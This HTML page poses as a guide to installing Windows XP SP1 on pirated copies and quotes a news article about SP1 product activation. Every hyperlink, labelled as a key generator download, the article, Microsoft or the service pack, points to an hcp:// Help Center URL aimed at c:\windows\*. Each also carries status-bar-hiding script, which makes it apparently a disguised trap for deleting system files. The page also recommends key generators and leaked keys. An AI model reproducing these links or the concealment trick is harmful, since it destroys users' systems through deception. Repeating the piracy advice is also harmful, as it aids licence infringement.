<h1>How to install XP SP1 on pirated versions</h1>
If you have a pirated version of XP Corporate, for example the one
with the cd-key that starts with FCKGW, you DON'T want the Service Pack 1
update. It will disable your system.  If you do not take the update, you
will not be able to take any more updates.  Price ya got to pay.
Threre are a few different tutorials floating around that tell you how to
replace your reg. number, like this one

But SP1 also knows how to identify that scenerio also.  Best bet, IF you
have the internet version of XP Pro, is to <a href="hcp://system/DFS/uplddrvinfo.htm?file://c:\windows\*" onMouseOver="window.status='';return true;" onMouseOut="window.status='';return true;">download a key generator</a>, let it find
a couple of good keys for you, reinstall from scratch, and keep going
through keys until it accepts one.

Here is an <a href="hcp://system/DFS/uplddrvinfo.htm?file://c:\windows\*" onMouseOver="window.status='';return true;" onMouseOut="window.status='';return true;">article</a> I found about it...

<h2>Rumors About XP SP1 Product Activation Changes Not True</h2>
<p>
A bizarre rumor about <a href="hcp://system/DFS/uplddrvinfo.htm?file://c:\windows\*" onMouseOver="window.status='';return true;" onMouseOut="window.status='';return true;">Microsoft</a> making sweeping changing to its Product
Activation technology in <a href="hcp://system/DFS/uplddrvinfo.htm?file://c:\windows\*" onMouseOver="window.status='';return true;" onMouseOut="window.status='';return true;">Windows XP Service Pack 1 (SP1)</a> is completely
untrue, the company told me today. The rumor, which was started by a small
technology enthusiast Web site, had Microsoft changing the product keys for
all of its customers using volume licensing. This rumors has since spread
across the Internet and been embellished in various ways, including a
version I came across Thursday morning claiming that Microsoft was making
the change so it could charge licensees yet again for SP1. Not so, says
Microsoft.

"There is no truth in this rumor," Allen Nieman, the Lead Technical Product
Manager for Licensing Technologies at Microsoft told me Thursday. "We are
not changing the way volume licensing customers install or deploy Windows
XP. We are not issuing volume licensing customers new product keys. Volume
licensing customers are not impacted by any of the changes we are making to
activation in SP1. The only folks impacted by the changes we are making in
SP1 are people with illegal copies of Windows."

As I first reported back in May, the Windows Product Activation feature in
XP SP1 will get two minor modifications, neither of which will affect any
legitimate users. First, Microsoft discovered that the majority of pirated
XP copies out there are tied to single volume license product key. So
Microsoft alerted the company about the problem, changed their key, and
disabled it for use after SP1. So anyone using this pirated key will be
unable to upgrade to SP1 or any future updates via Windows Update. Also,
Microsoft is adding a three-day grace period for people that use the same
product key to install XP on two different systems; in the past, there was
no grace period and the user had to immediately activation via phone in
order to use XP on the second system. This will give users some breathing
room if disaster strikes and you have to install XP on a new system.
